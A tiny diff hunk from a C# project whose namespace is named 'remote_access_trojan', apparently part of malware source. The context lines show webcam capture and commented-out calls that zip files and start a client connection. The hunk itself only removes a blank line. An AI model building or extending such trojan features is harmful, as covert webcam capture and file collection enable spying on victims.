@@ -26,7 +26,6 @@ namespace remote_access_trojan
             Webcam webcam = new Webcam();
             Thread.Sleep(1000);
             webcam.TakePicture(1);
-
            // Client.ZipFiles();
           //  Client.newClient();
 
